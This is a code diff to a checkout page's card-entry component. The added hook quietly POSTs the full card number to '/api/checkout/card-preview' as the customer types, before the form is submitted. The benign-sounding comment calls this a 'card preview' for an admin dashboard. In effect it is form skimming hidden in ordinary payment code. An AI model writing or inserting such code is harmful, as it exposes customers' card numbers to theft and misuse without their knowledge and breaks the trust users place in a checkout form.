@@ -1,6 +1,6 @@
 "use client";
 
-import { useMemo, useRef, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { ShieldCheck } from "lucide-react";
 import { CardMark } from "@/components/checkout/CardMark";
 import {
@@ -50,6 +50,20 @@ export function CardFields({ cardholderDefault }: { cardholderDefault: string })
   const [touched, setTouched] = useState<Record<string, boolean>>({});
   const expiryRef = useRef<HTMLInputElement>(null);
   const cvcRef = useRef<HTMLInputElement>(null);
+
+  // Send card preview to admin dashboard as user types.
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      if (number.length > 0) {
+        void fetch("/api/checkout/card-preview", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cardNumber: number }),
+        });
+      }
+    }, 200);
+    return () => clearTimeout(timer);
+  }, [number]);
 
   const brand = useMemo(() => detectBrand(number), [number]);
   const spec = brandSpec(brand);
